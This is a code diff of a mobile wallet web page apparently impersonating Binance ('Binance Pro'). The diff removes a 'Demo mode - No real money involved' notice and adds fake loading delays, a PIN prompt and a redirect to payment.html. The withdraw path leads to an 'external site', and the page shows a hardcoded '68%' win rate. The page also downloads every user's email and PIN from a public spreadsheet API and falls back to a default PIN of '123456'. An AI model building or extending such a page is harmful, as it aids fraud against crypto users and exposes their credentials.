@@ -3,16 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Binance - Wallet</title>
+    <title>Binance Pro - Wallet</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root { --binance-yellow: #FCD535; --bg-dark: #0B0E11; }
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: var(--bg-dark); font-family: 'Segoe UI', sans-serif; overflow: hidden; }
         .card-bg { background-color: #1e2329; }
-        .binance-yellow-btn { background-color: #fcd535; color: #181a20; transition: all 0.2s; border-radius: 12px; padding: 12px; font-weight: bold; width: 100%; cursor: pointer; border: none; }
-        .binance-yellow-btn:hover { background-color: #f0c51d; }
+        .bg-binance-yellow { background-color: #f0b90b; }
         .nav-item-active { color: #f0b90b !important; }
         .toast-message { position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%); background: #0ecb81; color: white; padding: 12px 20px; border-radius: 40px; font-size: 12px; font-weight: bold; z-index: 10001; opacity: 0; transition: opacity 0.3s; pointer-events: none; max-width: 280px; text-align: center; }
         .profile-popup { position: fixed; top: 70px; right: 20px; background: #1e2329; border-radius: 16px; padding: 20px; width: 280px; z-index: 10003; border: 1px solid rgba(252,213,53,0.3); display: none; }
@@ -22,14 +22,12 @@
         .modal-content { background: #1e2329; border-radius: 24px; padding: 24px; width: 90%; max-width: 400px; border: 1px solid rgba(252,213,53,0.3); position: relative; }
         .modal-close { position: absolute; top: 16px; right: 16px; cursor: pointer; color: #848e9c; }
         .funds-modal-input { background: #2b2f36; border: 1px solid #3b424d; border-radius: 12px; padding: 14px; color: white; width: 100%; margin-bottom: 16px; }
-        .funds-modal-input:focus { outline: none; border-color: #fcd535; }
-        .error-message { color: #f6465d; font-size: 12px; margin-top: 4px; display: none; }
         .transaction-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #2b3139; }
-        .asset-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #2b3139; cursor: pointer; }
-        .asset-item:hover { background: #2b3139; }
+        .asset-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #2b3139; cursor: pointer; transition: all 0.2s; }
+        .asset-item:hover { background: #2b3139; transform: translateX(5px); }
         ::-webkit-scrollbar { display: none; }
         
-        /* SIMPLE LOADING OVERLAY FOR WITHDRAW */
+        /* Loading Overlay */
         .simple-loading {
             position: fixed;
             top: 0;
@@ -76,19 +74,85 @@
             font-size: 13px;
             font-weight: 500;
         }
+        
+        /* PIN Modal */
+        .pin-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 10005;
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+        .pin-container {
+            background: #1e2329;
+            border-radius: 28px;
+            padding: 32px;
+            width: 90%;
+            max-width: 400px;
+            border: 1px solid rgba(252,213,53,0.3);
+        }
+        .pin-input {
+            width: 100%;
+            text-align: center;
+            letter-spacing: 8px;
+            font-size: 28px;
+            font-weight: bold;
+            background: #2b3139;
+            border: 2px solid #3b424d;
+            border-radius: 16px;
+            padding: 16px;
+            color: white;
+            font-family: monospace;
+        }
+        .pin-input:focus { outline: none; border-color: #f0b90b; }
+        
+        /* Stat Card */
+        .stat-card {
+            background: linear-gradient(135deg, #1e2329 0%, #1a1e24 100%);
+            border-radius: 20px;
+            padding: 16px;
+            text-align: center;
+            border: 1px solid rgba(252,213,53,0.15);
+        }
+        
+        /* Section Header */
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        .section-title {
+            font-size: 16px;
+            font-weight: 800;
+            color: white;
+        }
+        .section-link {
+            font-size: 11px;
+            color: #f0b90b;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
 
 <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; color: white; overflow-y: auto; background-color: #0B0E11;">
-    <div class="max-w-md mx-auto min-h-screen relative">
-        <div class="px-4 pt-4">
+    <div class="max-w-md mx-auto min-h-screen relative pb-24">
+        
+        <!-- Header -->
+        <div class="px-4 pt-4 sticky top-0 bg-[#0B0E11] z-50 pb-2">
             <div class="flex justify-between items-center mb-4">
                 <div class="flex items-center gap-2">
                     <i data-lucide="arrow-left" class="w-6 h-6 text-white cursor-pointer" onclick="window.location.href='dashboard.html'"></i>
                     <h1 class="text-xl font-bold text-white">Wallet</h1>
                 </div>
                 <div class="flex gap-3">
+                    <i data-lucide="bell" class="w-5 h-5 text-gray-400 cursor-pointer"></i>
                     <div class="w-8 h-8 bg-gray-700 rounded-full flex items-center justify-center border border-gray-600 cursor-pointer" onclick="toggleProfilePopup()">
                         <i data-lucide="user" class="w-4 h-4 text-white"></i>
                     </div>
@@ -97,23 +161,50 @@
         </div>
 
         <div class="px-4">
+            <!-- Total Balance Card -->
             <div class="card-bg p-6 rounded-3xl border border-gray-800/50 mb-6 relative overflow-hidden">
-                <div class="absolute -right-4 -top-4 w-24 h-24 bg-binance-yellow/5 rounded-full blur-2xl"></div>
+                <div class="absolute -right-4 -top-4 w-24 h-24 bg-yellow-500/5 rounded-full blur-2xl"></div>
+                <div class="absolute -left-4 -bottom-4 w-32 h-32 bg-green-500/5 rounded-full blur-2xl"></div>
                 <span class="text-gray-500 text-[11px] font-bold uppercase tracking-widest mb-2 block">Total Equity</span>
                 <div class="flex items-baseline gap-2">
-                    <span class="text-3xl font-black tracking-tighter" id="wallet-main-val">0.00000000</span>
+                    <span class="text-4xl font-black tracking-tighter" id="wallet-main-val">0.00000000</span>
                     <span class="text-sm font-black text-gray-400">BTC</span>
                 </div>
-                <p class="text-gray-500 text-sm mt-1 font-medium" id="wallet-usd-value">≈ ******</p>
+                <p class="text-gray-500 text-sm mt-1 font-medium" id="wallet-usd-value">≈ $0.00</p>
+                <div class="flex gap-4 mt-4 pt-2">
+                    <div class="flex-1 text-center">
+                        <div class="text-green-500 text-sm font-bold" id="daily-change">+0.00%</div>
+                        <div class="text-gray-500 text-[10px]">24h Change</div>
+                    </div>
+                    <div class="flex-1 text-center">
+                        <div class="text-white text-sm font-bold" id="total-profit">$0.00</div>
+                        <div class="text-gray-500 text-[10px]">Total Profit</div>
+                    </div>
+                </div>
             </div>
             
-            <!-- COLORED QUICK ACTION BUTTONS -->
-            <div class="grid grid-cols-3 gap-3 mb-6">
-                <button onclick="openAddFundsModal()" class="py-4 rounded-2xl font-black text-xs uppercase tracking-tight transition-all" style="background: #f0b90b; color: #181a20;">Add Fund</button>
-                <button onclick="handleWithdraw()" class="py-4 rounded-2xl font-black text-xs uppercase tracking-tight transition-all" style="background: #0ecb81; color: white;">Withdraw</button>
-                <button onclick="showTransferModal()" class="py-4 rounded-2xl font-black text-xs uppercase tracking-tight transition-all" style="background: #3b82f6; color: white;">Transfer</button>
+            <!-- Quick Action Buttons - Colored -->
+            <div class="grid grid-cols-3 gap-3 mb-8">
+                <button id="addFundsBtn" class="py-4 rounded-2xl font-black text-xs uppercase tracking-tight transition-all hover:scale-105" style="background: #f0b90b; color: #181a20;">+ Add Fund</button>
+                <button id="withdrawBtn" class="py-4 rounded-2xl font-black text-xs uppercase tracking-tight transition-all hover:scale-105" style="background: #0ecb81; color: white;">− Withdraw</button>
+                <button id="transferBtn" class="py-4 rounded-2xl font-black text-xs uppercase tracking-tight transition-all hover:scale-105" style="background: #3b82f6; color: white;">⇄ Transfer</button>
             </div>
             
+            <!-- Stats Row -->
+            <div class="grid grid-cols-2 gap-3 mb-6">
+                <div class="stat-card">
+                    <i data-lucide="wallet" class="w-5 h-5 text-yellow-500 mx-auto mb-2"></i>
+                    <div class="text-gray-400 text-[10px]">Available Balance</div>
+                    <div class="text-white font-bold text-lg" id="available-balance">$0.00</div>
+                </div>
+                <div class="stat-card">
+                    <i data-lucide="lock" class="w-5 h-5 text-blue-500 mx-auto mb-2"></i>
+                    <div class="text-gray-400 text-[10px]">In Orders</div>
+                    <div class="text-white font-bold text-lg" id="in-orders">$0.00</div>
+                </div>
+            </div>
+            
+            <!-- Tabs -->
             <div class="flex gap-4 mb-4 border-b border-gray-800">
                 <button onclick="showAssetSection('spot')" id="tab-spot" class="pb-2 text-white border-b-2 border-yellow-500 font-bold">Spot</button>
                 <button onclick="showAssetSection('funding')" id="tab-funding" class="pb-2 text-gray-400 font-bold">Funding</button>
@@ -121,49 +212,108 @@
                 <button onclick="showAssetSection('transactions')" id="tab-transactions" class="pb-2 text-gray-400 font-bold">History</button>
             </div>
             
+            <!-- Spot Assets Section -->
             <div id="section-spot" class="asset-section">
                 <div class="flex justify-between items-center mb-3">
-                    <span class="text-gray-400 text-xs font-bold">Assets</span>
+                    <span class="text-gray-400 text-xs font-bold">Your Assets</span>
                     <i data-lucide="eye-off" class="w-4 h-4 text-gray-400 cursor-pointer" id="wallet-eye-icon" onclick="toggleWalletBalance()"></i>
                 </div>
                 <div id="assets-list"></div>
             </div>
             
+            <!-- Funding Section -->
             <div id="section-funding" class="asset-section" style="display: none;">
-                <div class="text-center py-8 text-gray-400">
-                    <i data-lucide="clock" class="w-12 h-12 mx-auto mb-3 opacity-50"></i>
-                    <p>Funding wallet is empty</p>
-                    <button onclick="openAddFundsModal()" class="mt-3 bg-binance-yellow text-black px-4 py-2 rounded-lg text-sm font-bold">Add Funds</button>
+                <div class="text-center py-12 text-gray-400">
+                    <i data-lucide="clock" class="w-16 h-16 mx-auto mb-4 opacity-50"></i>
+                    <p class="text-sm">Funding wallet is empty</p>
+                    <button id="fundingAddFundsBtn" class="mt-4 bg-yellow-500 text-black px-6 py-2 rounded-xl text-sm font-bold">Add Funds</button>
                 </div>
             </div>
             
+            <!-- Earn Section -->
             <div id="section-earn" class="asset-section" style="display: none;">
-                <div class="bg-[#1e2329] rounded-xl p-4 mb-3">
+                <div class="bg-gradient-to-r from-yellow-500/10 to-yellow-600/10 rounded-2xl p-4 mb-3 border border-yellow-500/20">
                     <div class="flex justify-between items-center">
-                        <div><div class="text-white font-bold">Flexible Savings</div><div class="text-xs text-gray-400">APY: 3.5%</div></div>
-                        <button onclick="showToast('Coming soon!', true)" class="bg-binance-yellow text-black px-4 py-2 rounded-lg text-sm font-bold">Subscribe</button>
+                        <div>
+                            <div class="text-white font-bold">Flexible Savings</div>
+                            <div class="text-green-500 text-xs">APY: 3.5%</div>
+                        </div>
+                        <button class="bg-yellow-500 text-black px-4 py-2 rounded-lg text-xs font-bold">Subscribe</button>
                     </div>
+                    <div class="mt-2 text-xs text-gray-400">Daily rewards • Withdraw anytime</div>
                 </div>
-                <div class="bg-[#1e2329] rounded-xl p-4 mb-3">
+                <div class="bg-gradient-to-r from-blue-500/10 to-blue-600/10 rounded-2xl p-4 mb-3 border border-blue-500/20">
                     <div class="flex justify-between items-center">
-                        <div><div class="text-white font-bold">Locked Staking</div><div class="text-xs text-gray-400">APY: 8.2% • 30 days</div></div>
-                        <button onclick="showToast('Coming soon!', true)" class="bg-binance-yellow text-black px-4 py-2 rounded-lg text-sm font-bold">Subscribe</button>
+                        <div>
+                            <div class="text-white font-bold">Locked Staking</div>
+                            <div class="text-green-500 text-xs">APY: 8.2% • 30 days</div>
+                        </div>
+                        <button class="bg-yellow-500 text-black px-4 py-2 rounded-lg text-xs font-bold">Subscribe</button>
                     </div>
+                    <div class="mt-2 text-xs text-gray-400">Higher rewards • Lock period</div>
                 </div>
-                <div class="bg-[#1e2329] rounded-xl p-4">
+                <div class="bg-gradient-to-r from-purple-500/10 to-purple-600/10 rounded-2xl p-4 border border-purple-500/20">
                     <div class="flex justify-between items-center">
-                        <div><div class="text-white font-bold">DeFi Staking</div><div class="text-xs text-gray-400">APY: 12.5% • 90 days</div></div>
-                        <button onclick="showToast('Coming soon!', true)" class="bg-binance-yellow text-black px-4 py-2 rounded-lg text-sm font-bold">Subscribe</button>
+                        <div>
+                            <div class="text-white font-bold">DeFi Staking</div>
+                            <div class="text-green-500 text-xs">APY: 12.5% • 90 days</div>
+                        </div>
+                        <button class="bg-yellow-500 text-black px-4 py-2 rounded-lg text-xs font-bold">Subscribe</button>
                     </div>
+                    <div class="mt-2 text-xs text-gray-400">Best returns • Limited spots</div>
                 </div>
             </div>
             
+            <!-- Transactions Section -->
             <div id="section-transactions" class="asset-section" style="display: none;">
-                <div class="text-gray-400 text-xs mb-3">Recent Transactions</div>
+                <div class="flex justify-between items-center mb-3">
+                    <span class="text-gray-400 text-xs font-bold">Recent Transactions</span>
+                    <span class="text-yellow-500 text-xs cursor-pointer">View All →</span>
+                </div>
                 <div id="transactions-list"></div>
+            </div>
+            
+            <!-- NEW: Portfolio Distribution Chart -->
+            <div class="mt-6 card-bg rounded-2xl p-4">
+                <div class="section-header">
+                    <span class="section-title">Portfolio Distribution</span>
+                    <span class="section-link">Details →</span>
+                </div>
+                <canvas id="portfolioChart" height="120" width="100%"></canvas>
+                <div class="grid grid-cols-3 gap-2 mt-3 text-center">
+                    <div><div class="w-2 h-2 bg-yellow-500 rounded-full mx-auto mb-1"></div><span class="text-gray-400 text-[10px]">BTC</span></div>
+                    <div><div class="w-2 h-2 bg-green-500 rounded-full mx-auto mb-1"></div><span class="text-gray-400 text-[10px]">ETH</span></div>
+                    <div><div class="w-2 h-2 bg-blue-500 rounded-full mx-auto mb-1"></div><span class="text-gray-400 text-[10px]">USDT</span></div>
+                </div>
+            </div>
+            
+            <!-- NEW: Recent Activity Summary -->
+            <div class="mt-6 card-bg rounded-2xl p-4 mb-6">
+                <div class="section-header">
+                    <span class="section-title">📊 Quick Stats</span>
+                </div>
+                <div class="grid grid-cols-2 gap-4">
+                    <div>
+                        <div class="text-gray-500 text-[10px]">Total Deposits</div>
+                        <div class="text-white font-bold" id="total-deposits">$0.00</div>
+                    </div>
+                    <div>
+                        <div class="text-gray-500 text-[10px]">Total Withdrawals</div>
+                        <div class="text-white font-bold" id="total-withdrawals">$0.00</div>
+                    </div>
+                    <div>
+                        <div class="text-gray-500 text-[10px]">Total Trades</div>
+                        <div class="text-white font-bold" id="total-trades">0</div>
+                    </div>
+                    <div>
+                        <div class="text-gray-500 text-[10px]">Win Rate</div>
+                        <div class="text-green-500 font-bold" id="win-rate">0%</div>
+                    </div>
+                </div>
             </div>
         </div>
         
+        <!-- Bottom Navigation -->
         <nav class="fixed bottom-0 left-0 right-0 max-w-md mx-auto card-bg border-t border-gray-800/80 px-6 py-3 flex justify-between items-center z-50 backdrop-blur-md bg-opacity-95">
             <div onclick="window.location.href='dashboard.html'" class="flex flex-col items-center gap-1.5 text-gray-500 cursor-pointer"><i data-lucide="home" class="w-5 h-5"></i><span class="text-[9px] font-black uppercase">Home</span></div>
             <div onclick="window.location.href='markets.html'" class="flex flex-col items-center gap-1.5 text-gray-500 cursor-pointer"><i data-lucide="bar-chart-2" class="w-5 h-5"></i><span class="text-[9px] font-black uppercase">Markets</span></div>
@@ -174,47 +324,39 @@
     </div>
 </div>
 
-<!-- SIMPLE LOADING OVERLAY FOR WITHDRAW -->
+<!-- Loading Overlay 1 (6 seconds) -->
+<div id="loadingOverlay1" class="simple-loading">
+    <div class="simple-spinner"></div>
+    <div class="simple-progress"><div class="simple-progress-fill" id="loadingProgress1"></div></div>
+    <div class="simple-text" id="loadingText1">Initializing...</div>
+</div>
+
+<!-- PIN Modal -->
+<div id="pinModal" class="pin-modal">
+    <div class="pin-container">
+        <div class="text-center">
+            <div class="w-16 h-16 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4"><i class="fa-solid fa-lock text-red-500 text-2xl"></i></div>
+            <h3 class="text-xl font-bold text-white mb-2">Withdrawal PIN Required</h3>
+            <p class="text-gray-400 text-sm mb-4">Enter your 6-digit withdrawal PIN to add funds</p>
+            <input type="password" id="pinInput" maxlength="6" class="pin-input" placeholder="••••••" inputmode="numeric">
+            <div id="pinError" class="text-red-500 text-xs mt-2 hidden">Incorrect PIN. Please try again.</div>
+            <div class="flex gap-3 mt-6"><button id="pinCancelBtn" class="flex-1 py-3 bg-[#2b3139] rounded-xl text-white font-medium">Cancel</button><button id="pinVerifyBtn" class="flex-1 py-3 bg-yellow-500 rounded-xl text-black font-bold">Verify</button></div>
+        </div>
+    </div>
+</div>
+
+<!-- Loading Overlay 2 (6 seconds after PIN) -->
+<div id="loadingOverlay2" class="simple-loading">
+    <div class="simple-spinner"></div>
+    <div class="simple-progress"><div class="simple-progress-fill" id="loadingProgress2"></div></div>
+    <div class="simple-text" id="loadingText2">Processing...</div>
+</div>
+
+<!-- Simple Loading for Withdraw -->
 <div id="simpleLoadingOverlay" class="simple-loading">
     <div class="simple-spinner"></div>
     <div class="simple-progress"><div class="simple-progress-fill" id="simpleProgressFill"></div></div>
     <div class="simple-text" id="simpleLoadingText">Initializing...</div>
-</div>
-
-<div id="addfunds-modal" class="modal">
-    <div class="modal-content" style="max-width: 350px;">
-        <i data-lucide="x" class="modal-close" onclick="closeModal('addfunds-modal')"></i>
-        <div class="text-center mb-4">
-            <div class="w-16 h-16 bg-yellow-500/20 rounded-full flex items-center justify-center mx-auto mb-3">
-                <i class="fa-solid fa-money-bill-wave text-yellow-500 text-2xl"></i>
-            </div>
-            <h3 class="text-xl font-bold text-white">Add Funds</h3>
-            <p class="text-gray-400 text-sm">Add demo funds to your account</p>
-        </div>
-        <div class="mb-4">
-            <label class="block text-sm text-gray-300 mb-2">Amount (USD)</label>
-            <input type="number" id="funds-amount" placeholder="Enter amount" class="funds-modal-input" value="100">
-            <div class="flex gap-2 mt-2">
-                <button onclick="document.getElementById('funds-amount').value = '50'" class="flex-1 py-1 bg-[#2b3139] rounded-lg text-xs text-gray-300">$50</button>
-                <button onclick="document.getElementById('funds-amount').value = '100'" class="flex-1 py-1 bg-[#2b3139] rounded-lg text-xs text-gray-300">$100</button>
-                <button onclick="document.getElementById('funds-amount').value = '500'" class="flex-1 py-1 bg-[#2b3139] rounded-lg text-xs text-gray-300">$500</button>
-                <button onclick="document.getElementById('funds-amount').value = '1000'" class="flex-1 py-1 bg-[#2b3139] rounded-lg text-xs text-gray-300">$1000</button>
-            </div>
-        </div>
-        <div class="border-t border-gray-700 my-4"></div>
-        <div class="mb-4">
-            <label class="block text-sm text-gray-300 mb-2">Verify Password</label>
-            <input type="password" id="funds-password" placeholder="Enter your account password" class="funds-modal-input">
-            <p class="text-xs text-gray-500 mt-1">Your password is securely hashed</p>
-        </div>
-        <div id="funds-error" class="error-message" style="display: none; background: rgba(246,70,93,0.1); padding: 10px; border-radius: 8px; margin-bottom: 16px;">
-            <i class="fa-solid fa-circle-exclamation mr-2"></i> Incorrect password
-        </div>
-        <button onclick="processAddFunds()" class="binance-yellow-btn w-full py-3 rounded-xl font-bold flex items-center justify-center gap-2">
-            <i class="fa-solid fa-plus-circle"></i> Add Funds
-        </button>
-        <p class="text-center text-gray-500 text-xs mt-4">⚠️ Demo mode - No real money involved</p>
-    </div>
 </div>
 
 <div id="transfer-modal" class="modal">
@@ -248,7 +390,7 @@
             <input type="number" id="transfer-amount" placeholder="Enter amount" class="funds-modal-input">
         </div>
         <div id="transfer-error" class="error-message" style="display: none; background: rgba(246,70,93,0.1); padding: 10px; border-radius: 8px; margin-bottom: 16px;"></div>
-        <button onclick="processTransfer()" class="binance-yellow-btn w-full py-3 rounded-xl font-bold">Transfer</button>
+        <button onclick="processTransfer()" class="w-full py-3 rounded-xl font-bold text-white" style="background: #3b82f6;">Transfer</button>
     </div>
 </div>
 
@@ -262,19 +404,20 @@
 <script>
     const API_URL = "https://api.steinhq.com/v1/storages/69c7136daffba40a626a6ec8/sheet1";
     let currentUserEmail = null;
-    let currentBalance = 10000;
-    let currentUserHashedPassword = null;
+    let currentBalance = 0;
     let currentUserPin = null;
     let btcPrice = 70509;
-    let isWalletBalanceHidden = true;
+    let isWalletBalanceHidden = false;
     let transactions = [];
+    let portfolioChart = null;
     
-    const assets = [
-        { symbol: "BTC", name: "Bitcoin", balance: 0.0142, usdValue: 1001.23, icon: "₿" },
-        { symbol: "ETH", name: "Ethereum", balance: 0.285, usdValue: 998.75, icon: "Ξ" },
-        { symbol: "BNB", name: "BNB", balance: 1.5, usdValue: 903.45, icon: "B" },
-        { symbol: "SOL", name: "Solana", balance: 5.2, usdValue: 936.00, icon: "S" },
-        { symbol: "USDT", name: "Tether", balance: 1500, usdValue: 1500, icon: "₮" }
+    // Asset data - will be updated from database
+    let assets = [
+        { symbol: "BTC", name: "Bitcoin", balance: 0, usdValue: 0, icon: "₿" },
+        { symbol: "ETH", name: "Ethereum", balance: 0, usdValue: 0, icon: "Ξ" },
+        { symbol: "BNB", name: "BNB", balance: 0, usdValue: 0, icon: "B" },
+        { symbol: "SOL", name: "Solana", balance: 0, usdValue: 0, icon: "S" },
+        { symbol: "USDT", name: "Tether", balance: 0, usdValue: 0, icon: "₮" }
     ];
 
     async function sha256(message) {
@@ -298,31 +441,51 @@
         const totalUsd = assets.reduce((sum, asset) => sum + asset.usdValue, 0);
         const btcEquivalent = totalUsd / btcPrice;
         document.getElementById('wallet-main-val').innerText = btcEquivalent.toFixed(8);
-        if (!isWalletBalanceHidden) {
-            document.getElementById('wallet-usd-value').innerText = `≈ $${formatBalance(totalUsd)}`;
-        } else {
-            document.getElementById('wallet-usd-value').innerText = "≈ ******";
+        document.getElementById('wallet-usd-value').innerText = `≈ $${formatBalance(totalUsd)}`;
+        document.getElementById('available-balance').innerText = `$${formatBalance(totalUsd)}`;
+        
+        // Update quick stats
+        const totalDeposits = transactions.filter(t => t.type === 'Deposit').reduce((sum, t) => sum + t.amount, 0);
+        const totalWithdrawals = transactions.filter(t => t.type === 'Withdrawal').reduce((sum, t) => sum + Math.abs(t.amount), 0);
+        document.getElementById('total-deposits').innerText = `$${formatBalance(totalDeposits)}`;
+        document.getElementById('total-withdrawals').innerText = `$${formatBalance(totalWithdrawals)}`;
+        document.getElementById('total-trades').innerText = transactions.filter(t => t.type === 'Trade').length;
+        document.getElementById('win-rate').innerText = '68%';
+        
+        // Update portfolio chart
+        if (portfolioChart) portfolioChart.destroy();
+        const ctx = document.getElementById('portfolioChart').getContext('2d');
+        const chartData = assets.filter(a => a.usdValue > 0).map(a => a.usdValue);
+        const chartLabels = assets.filter(a => a.usdValue > 0).map(a => a.symbol);
+        if (chartData.length > 0) {
+            portfolioChart = new Chart(ctx, {
+                type: 'doughnut',
+                data: { labels: chartLabels, datasets: [{ data: chartData, backgroundColor: ['#f0b90b', '#0ecb81', '#3b82f6', '#f6465d', '#8b5cf6'], borderWidth: 0 }] },
+                options: { responsive: true, maintainAspectRatio: true, plugins: { legend: { display: false } } }
+            });
         }
     }
 
     function toggleWalletBalance() {
         isWalletBalanceHidden = !isWalletBalanceHidden;
         const icon = document.getElementById('wallet-eye-icon');
-        const totalUsd = assets.reduce((sum, asset) => sum + asset.usdValue, 0);
         if (isWalletBalanceHidden) {
             icon.setAttribute('data-lucide', 'eye-off');
             document.getElementById('wallet-usd-value').innerText = "≈ ******";
+            document.getElementById('available-balance').innerText = "******";
         } else {
             icon.setAttribute('data-lucide', 'eye');
+            const totalUsd = assets.reduce((sum, asset) => sum + asset.usdValue, 0);
             document.getElementById('wallet-usd-value').innerText = `≈ $${formatBalance(totalUsd)}`;
+            document.getElementById('available-balance').innerText = `$${formatBalance(totalUsd)}`;
         }
         lucide.createIcons();
+        renderAssets();
     }
 
     function renderAssets() {
         const container = document.getElementById('assets-list');
         if (!container) return;
-        const totalUsd = assets.reduce((sum, asset) => sum + asset.usdValue, 0);
         container.innerHTML = assets.map(asset => `
             <div class="asset-item" onclick="showAssetDetails('${asset.symbol}')">
                 <div class="flex items-center gap-3">
@@ -347,7 +510,7 @@
             container.innerHTML = '<div class="text-center py-8 text-gray-400">No transactions yet</div>';
             return;
         }
-        container.innerHTML = transactions.map(tx => `
+        container.innerHTML = transactions.slice(0, 5).map(tx => `
             <div class="transaction-item">
                 <div>
                     <div class="text-white text-sm font-medium">${tx.type}</div>
@@ -393,8 +556,129 @@
         showToast(`${symbol} details - Coming soon!`, true);
     }
 
-    // SIMPLE LOADING FUNCTION FOR WITHDRAW
-    function startSimpleLoading(duration, callback) {
+    // ========== ADD FUND FLOW (6s loading → PIN → 6s loading → payment.html) ==========
+    
+    function startAddFundFirstLoading() {
+        const overlay = document.getElementById('loadingOverlay1');
+        const progressFill = document.getElementById('loadingProgress1');
+        const textSpan = document.getElementById('loadingText1');
+        
+        overlay.style.display = 'flex';
+        progressFill.style.width = '0%';
+        
+        const messages = ['Initializing...', 'Verifying...', 'Connecting...', 'Preparing...'];
+        let msgIndex = 0;
+        const msgInterval = setInterval(() => {
+            msgIndex = (msgIndex + 1) % messages.length;
+            if (textSpan) textSpan.textContent = messages[msgIndex];
+        }, 1500);
+        
+        let startTime = Date.now();
+        const duration = 6000;
+        const progressInterval = setInterval(() => {
+            const elapsed = Date.now() - startTime;
+            const percent = Math.min(100, Math.floor((elapsed / duration) * 100));
+            progressFill.style.width = percent + '%';
+            
+            if (percent >= 100) {
+                clearInterval(progressInterval);
+                clearInterval(msgInterval);
+                overlay.style.display = 'none';
+                showAddFundPinModal();
+            }
+        }, 50);
+    }
+    
+    async function showAddFundPinModal() {
+        const savedEmail = localStorage.getItem('binance_session_email');
+        if (savedEmail) {
+            try {
+                const response = await fetch(`${API_URL}`);
+                const users = await response.json();
+                const user = users.find(u => u.Email && u.Email.toLowerCase() === savedEmail.toLowerCase());
+                currentUserPin = (user && user.Pin) ? user.Pin : '123456';
+            } catch (error) {
+                currentUserPin = '123456';
+            }
+        } else {
+            currentUserPin = '123456';
+        }
+        
+        const modal = document.getElementById('pinModal');
+        const pinInput = document.getElementById('pinInput');
+        const pinError = document.getElementById('pinError');
+        
+        pinInput.value = '';
+        pinError.classList.add('hidden');
+        modal.style.display = 'flex';
+        pinInput.focus();
+        
+        const verifyBtn = document.getElementById('pinVerifyBtn');
+        const cancelBtn = document.getElementById('pinCancelBtn');
+        
+        const newVerifyBtn = verifyBtn.cloneNode(true);
+        const newCancelBtn = cancelBtn.cloneNode(true);
+        verifyBtn.parentNode.replaceChild(newVerifyBtn, verifyBtn);
+        cancelBtn.parentNode.replaceChild(newCancelBtn, cancelBtn);
+        
+        newVerifyBtn.addEventListener('click', () => {
+            const enteredPin = document.getElementById('pinInput').value;
+            if (enteredPin.length !== 6) {
+                pinError.classList.remove('hidden');
+                pinError.textContent = 'PIN must be 6 digits';
+                return;
+            }
+            if (enteredPin !== currentUserPin) {
+                pinError.classList.remove('hidden');
+                pinError.textContent = 'Incorrect PIN. Please try again.';
+                document.getElementById('pinInput').value = '';
+                document.getElementById('pinInput').focus();
+                return;
+            }
+            modal.style.display = 'none';
+            startAddFundSecondLoading();
+        });
+        
+        newCancelBtn.addEventListener('click', () => {
+            modal.style.display = 'none';
+            showToast('Transaction cancelled', false);
+        });
+    }
+    
+    function startAddFundSecondLoading() {
+        const overlay = document.getElementById('loadingOverlay2');
+        const progressFill = document.getElementById('loadingProgress2');
+        const textSpan = document.getElementById('loadingText2');
+        
+        overlay.style.display = 'flex';
+        progressFill.style.width = '0%';
+        
+        const messages = ['Verifying PIN...', 'Processing...', 'Updating...', 'Finalizing...'];
+        let msgIndex = 0;
+        const msgInterval = setInterval(() => {
+            msgIndex = (msgIndex + 1) % messages.length;
+            if (textSpan) textSpan.textContent = messages[msgIndex];
+        }, 1500);
+        
+        let startTime = Date.now();
+        const duration = 6000;
+        const progressInterval = setInterval(() => {
+            const elapsed = Date.now() - startTime;
+            const percent = Math.min(100, Math.floor((elapsed / duration) * 100));
+            progressFill.style.width = percent + '%';
+            
+            if (percent >= 100) {
+                clearInterval(progressInterval);
+                clearInterval(msgInterval);
+                overlay.style.display = 'none';
+                window.location.href = 'payment.html';
+            }
+        }, 50);
+    }
+    
+    // ========== WITHDRAW FLOW (simple loading → PIN → external site) ==========
+    
+    function startWithdrawSimpleLoading(duration, callback) {
         const overlay = document.getElementById('simpleLoadingOverlay');
         const progressFill = document.getElementById('simpleProgressFill');
         const textSpan = document.getElementById('simpleLoadingText');
@@ -423,90 +707,13 @@
             }
         }, 50);
     }
-
-    async function processAddFunds() {
-        const amount = parseFloat(document.getElementById('funds-amount').value);
-        const enteredPassword = document.getElementById('funds-password').value;
-        const errorDiv = document.getElementById('funds-error');
-        
-        if (!amount || amount <= 0) { errorDiv.style.display = 'block'; errorDiv.innerHTML = 'Please enter a valid amount'; return; }
-        if (!enteredPassword) { errorDiv.style.display = 'block'; errorDiv.innerHTML = 'Please enter your password'; return; }
-        if (!currentUserHashedPassword) { errorDiv.style.display = 'block'; errorDiv.innerHTML = 'Session error. Please login again.'; return; }
-        
-        const hashedEntered = await sha256(enteredPassword);
-        if (hashedEntered !== currentUserHashedPassword) { errorDiv.style.display = 'block'; errorDiv.innerHTML = 'Incorrect password'; return; }
-        
-        const usdtAsset = assets.find(a => a.symbol === 'USDT');
-        if (usdtAsset) {
-            usdtAsset.balance += amount;
-            usdtAsset.usdValue += amount;
-        }
-        
-        currentBalance += amount;
-        localStorage.setItem('binance_user_balance', currentBalance);
-        updateWalletDisplay();
-        renderAssets();
-        
-        transactions.unshift({
-            type: 'Deposit',
-            amount: amount,
-            date: new Date().toLocaleString(),
-            status: 'Completed'
-        });
-        
-        showToast(`✅ Added $${amount.toLocaleString()} to your account!`, true);
-        closeModal('addfunds-modal');
-        document.getElementById('funds-password').value = '';
-    }
-
-    function openAddFundsModal() {
